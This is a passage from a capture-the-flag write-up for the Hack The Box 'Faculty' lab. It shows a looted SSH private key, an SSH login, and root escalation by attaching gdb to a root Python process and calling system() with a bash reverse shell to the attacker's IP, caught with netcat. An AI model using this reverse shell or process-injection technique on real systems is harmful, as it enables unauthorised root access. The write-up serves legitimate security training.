nJrCLu1qpMmdJgzdrEvt7jJOiN9+tcds7QBtWgvcSV+xCbB5lw0S2fBtUYmyqSNFqgFjUl
xww73MA6Zlg5PjZSESpKRnFQcs4RvMdWs7ylkvRt+s3iywEQT+N2seHgFa7AHfu4oN75fS
L/mbUc5B9D7DIa4iJRwTVMvXRQBj+WmuGVJGB4tfzJQZ7FjoIkRzIHCc3FlzhniCW7XHad
mgTo2ZRifhuri1q8cJV/WpzN4D100+AxqmVdUKf9/iWRdffylydXa9It9vI7GjJcw4oxeW
2Y6QDnC8UtFfOLffUf+20Wy3RcTBP9Mcm+kDCnDA5y6w1JnYYjm0TmRZd7+YZ7FvQqBS4i
hP+I1ij+pT1Pt9Rjk6SrS12DA23HqQAAAAMBAAEAAAGBAIjXSPMC0Jvr/oMaspxzULdwpv
JbW3BKHB+Zwtpxa55DntSeLUwXpsxzXzIcWLwTeIbS35hSpK/A5acYaJ/yJOyOAdsbYHpa
ELWupj/TFE/66xwXJfilBxsQctr0i62yVAVfsR0Sng5/qRt/8orbGrrNIJU2uje7ToHMLN
J0J1A6niLQuh4LBHHyTvUTRyC72P8Im5varaLEhuHxnzg1g81loA8jjvWAeUHwayNxG8uu
ng+nLalwTM/usMo9Jnvx/UeoKnKQ4r5AunVeM7QQTdEZtwMk2G4vOZ9ODQztJO7aCDCiEv
Hx9U9A6HNyDEMfCebfsJ9voa6i+rphRzK9or/+IbjH3JlnQOZw8JRC1RpI/uTECivtmkp4
ZrFF5YAo9ie7ctB2JIujPGXlv/F8Ue9FGN6W4XW7b+HfnG5VjCKYKyrqk/yxMmg6w2Y5P5
N/NvWYyoIZPQgXKUlTzYj984plSl2+k9Tca27aahZOSLUceZqq71aXyfKPGWoITp5dAQAA
AMEAl5stT0pZ0iZLcYi+b/7ZAiGTQwWYS0p4Glxm204DedrOD4c/Aw7YZFZLYDlL2KUk6o
0M2X9joquMFMHUoXB7DATWknBS7xQcCfXH8HNuKSN385TCX/QWNfWVnuIhl687Dqi2bvBt
pMMKNYMMYDErB1dpYZmh8mcMZgHN3lAK06Xdz57eQQt0oGq6btFdbdVDmwm+LuTRwxJSCs
Qtc2vyQOEaOpEad9RvTiMNiAKy1AnlViyoXAW49gIeK1ay7z3jAAAAwQDxEUTmwvt+oX1o
1U/ZPaHkmi/VKlO3jxABwPRkFCjyDt6AMQ8K9kCn1ZnTLy+J1M+tm1LOxwkY3T5oJi/yLt
ercex4AFaAjZD7sjX9vDqX8atR8M1VXOy3aQ0HGYG2FF7vEFwYdNPfGqFLxLvAczzXHBud
QzVDjJkn6+ANFdKKR3j3s9xnkb5j+U/jGzxvPGDpCiZz0I30KRtAzsBzT1ZQMEvKrchpmR
jrzHFkgTUug0lsPE4ZLB0Re6Iq3ngtaNUAAADBANBXLol4lHhpWL30or8064fjhXGjhY4g
blDouPQFIwCaRbSWLnKvKCwaPaZzocdHlr5wRXwRq8V1VPmsxX8O87y9Ro5guymsdPprXF
LETXujOl8CFiHvMA1Zf6eriE1/Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVF
YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ==
-----END OPENSSH PRIVATE KEY-----
```

```
┌──(kali㉿kali)-[~/ctf/htb/faculty/loot]
└─$ ssh developer@faculty.htb -i id_rsa 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  3 09:46:30 CEST 2022

  System load:           0.85
  Usage of /:            79.9% of 4.67GB
  Memory usage:          48%
  Swap usage:            0%
  Processes:             164
  Users logged in:       1
  IPv4 address for eth0: 10.129.91.184
  IPv6 address for eth0: dead:beef::250:56ff:fe96:f911


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jul  3 00:29:22 2022 from 10.10.14.173
developer@faculty:~$ 
```


## Way to root

```Linpeas.sh``` reveals that ```gdb``` is installed which is unusual.
```

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb  
```

Lets check if there is a python process running as root and attach to it:

```
developer@faculty:~$ ps aux | grep python
root         638  0.0  0.9  26896 18088 ?        Ss   Jul02   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
```

Attaching to the process with PID ```638``` :

```
developer@faculty:~$ gdb -p 638
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.                                                                                                           
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 638
Reading symbols from /usr/bin/python3.8...
(No debugging symbols found in /usr/bin/python3.8)
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug...
Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0...
Reading symbols from /usr/lib/debug/.build-id/7b/4536f41cdaa5888408e82d0836e33dcf436466.debug...
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
Reading symbols from /usr/lib/debug/.build-id/c0/f40155b3f8bf8c494fa800f9ab197ebe20ed6e.debug...
Reading symbols from /lib/x86_64-linux-gnu/libutil.so.1...
Reading symbols from /usr/lib/debug/.build-id/4f/3ee75c38f09d6346de1e8eca0f8d8a41071d9f.debug...
Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...
Reading symbols from /usr/lib/debug/.build-id/fe/91b4090ea04c1559ff71dd9290062776618891.debug...
Reading symbols from /lib/x86_64-linux-gnu/libexpat.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libexpat.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libz.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libz.so.1)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
Reading symbols from /lib/x86_64-linux-gnu/libnss_files.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/da81f0ac3660e3c3cb947c6244151d879ed9e8.debug...
Reading symbols from /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libglib-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libglib-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgobject-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgobject-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgirepository-1.0.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgirepository-1.0.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libffi.so.7...
(No debugging symbols found in /lib/x86_64-linux-gnu/libffi.so.7)
Reading symbols from /lib/x86_64-linux-gnu/libpcre.so.3...
(No debugging symbols found in /lib/x86_64-linux-gnu/libpcre.so.3)
Reading symbols from /lib/x86_64-linux-gnu/libgmodule-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgmodule-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgio-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgio-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libmount.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libmount.so.1)
--Type <RET> for more, q to quit, c to continue without paging--
Reading symbols from /lib/x86_64-linux-gnu/libselinux.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libselinux.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libresolv.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/19041bde5b859c55798ac0745b0b6199cb7d94.debug...
Reading symbols from /lib/x86_64-linux-gnu/libblkid.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libblkid.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libpcre2-8.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libpcre2-8.so.0)
Reading symbols from /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libdbus-1.so.3...
(No debugging symbols found in /lib/x86_64-linux-gnu/libdbus-1.so.3)
Reading symbols from /lib/x86_64-linux-gnu/libsystemd.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libsystemd.so.0)
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
Reading symbols from /usr/lib/debug/.build-id/ce/016c975d94bc4770ed8c62d45dea6b71405a2c.debug...
Reading symbols from /lib/x86_64-linux-gnu/liblzma.so.5...
(No debugging symbols found in /lib/x86_64-linux-gnu/liblzma.so.5)
Reading symbols from /lib/x86_64-linux-gnu/liblz4.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/liblz4.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libgcrypt.so.20...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgcrypt.so.20)
Reading symbols from /lib/x86_64-linux-gnu/libgpg-error.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgpg-error.so.0)
Reading symbols from /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libbz2.so.1.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libbz2.so.1.0)
Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so)
0x00007fe1f2afa967 in __GI___poll (fds=0x1c15a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
(gdb) 
```
We can now execute code within the python process, by calling the native ```system()``` function of python and execute a python reverse shell from revshells.com:
```
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.14.173/9001 0>&1'")
[Detaching after vfork from child process 28837]
```
Catch the reverse shell of root
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001                                                                                                                                     130 ⨯
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.92.70.
Ncat: Connection from 10.129.92.70:52466.
bash: cannot set terminal process group (638): Inappropriate ioctl for device
bash: no job control in this shell
root@faculty:/# 
```